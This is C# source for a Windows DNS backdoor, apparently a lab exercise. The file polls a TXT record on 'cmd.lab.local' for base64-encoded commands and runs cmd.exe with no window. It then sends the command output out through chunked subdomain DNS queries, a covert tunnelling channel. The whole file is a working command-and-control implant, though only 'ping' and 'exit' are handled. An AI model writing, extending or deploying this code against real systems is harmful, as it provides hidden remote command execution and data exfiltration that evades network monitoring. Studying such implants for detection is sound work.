using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace A06_6_DNS_Backdoor
{
    class Program
    {
        private static readonly string RootDomain = "cmd.lab.local";
        private static bool _isRunning = true;

        private const ushort DNS_TYPE_TEXT = 0x0010;
        private const uint DNS_QUERY_STANDARD = 0x00000000;

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DNS_TXT_DATA
        {
            public uint dwStringCount;
            public IntPtr pStringArray;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DNS_RECORD
        {
            public IntPtr pNext;
            public string pName;
            public ushort wType;
            public ushort wDataLength;
            public uint flags;
            public uint dwTtl;
            public uint dwReserved;
            public DNS_TXT_DATA Data;
        }

        [DllImport("dnsapi.dll", CharSet = CharSet.Unicode, EntryPoint = "DnsQuery_W")]
        private static extern int DnsQuery(
            string pszName,
            ushort wType,
            uint Options,
            IntPtr pExtra,
            out IntPtr ppQueryResultsSet,
            IntPtr pReserved
        );

        [DllImport("dnsapi.dll")]
        private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);

        private static string _lastCommand = string.Empty;

        static void Main(string[] args)
        {
            while (_isRunning)
            {
                string queryTarget = $"agent77.{RootDomain}";
                string? rawPayload = FetchNativeTxtRecord(queryTarget);

                if (!string.IsNullOrEmpty(rawPayload))
                {
                    string commandLine = DecodeBase64(rawPayload).ToLower().Trim();

                    if (commandLine != _lastCommand)
                    {
                        _lastCommand = commandLine;

                        switch (commandLine)
                        {
                            case "ping":
                                try
                                {
                                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
                                    proc.StartInfo.FileName = "cmd.exe";
                                    proc.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2";
                                    proc.StartInfo.RedirectStandardOutput = true;
                                    proc.StartInfo.UseShellExecute = false;
                                    proc.StartInfo.CreateNoWindow = true;
                                    proc.Start();

                                    string output = proc.StandardOutput.ReadToEnd();
                                    proc.WaitForExit();

                                    byte[] textBytes = Encoding.UTF8.GetBytes(output);
                                    string base64Output = Convert.ToBase64String(textBytes);
                                    base64Output = base64Output.Replace("=", "");

                                    int chunkSize = 30;
                                    for (int i = 0; i < base64Output.Length; i += chunkSize)
                                    {
                                        string chunk = (i + chunkSize >= base64Output.Length)
                                            ? base64Output.Substring(i)
                                            : base64Output.Substring(i, chunkSize);

                                        string exfilDomain = $"data.{i / chunkSize}.{chunk}.{RootDomain}";

                                        IntPtr pDummy = IntPtr.Zero;
                                        DnsQuery(exfilDomain, 0x0001, DNS_QUERY_STANDARD, IntPtr.Zero, out pDummy, IntPtr.Zero);
                                        if (pDummy != IntPtr.Zero) DnsRecordListFree(pDummy, 0);

                                        Thread.Sleep(500);
                                    }
                                }
                                catch { }
                                break;

                            case "exit":
                                _isRunning = false;
                                break;
                        }
                    }
                }

                Thread.Sleep(30000);
            }
        }

        private static string? FetchNativeTxtRecord(string domain)
        {
            IntPtr pResultList = IntPtr.Zero;

            int status = DnsQuery(domain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, IntPtr.Zero, out pResultList, IntPtr.Zero);

            if (status == 0 && pResultList != IntPtr.Zero)
            {
                // Explicitly check for null before handling unmanaged structures
                object? unmanagedStruct = Marshal.PtrToStructure(pResultList, typeof(DNS_RECORD));
                if (unmanagedStruct is DNS_RECORD record)
                {
                    if (record.wType == DNS_TYPE_TEXT && record.Data.dwStringCount > 0)
                    {
                        IntPtr pString = Marshal.ReadIntPtr(record.Data.pStringArray);
                        string? txtResult = Marshal.PtrToStringUni(pString);

                        DnsRecordListFree(pResultList, 0);
                        return txtResult;
                    }
                }
                DnsRecordListFree(pResultList, 0);
            }
            return null;
        }

        private static string DecodeBase64(string base64Data)
        {
            try
            {
                byte[] data = Convert.FromBase64String(base64Data);
                return Encoding.UTF8.GetString(data);
            }
            catch
            {
                return string.Empty;
            }
        }
    }
}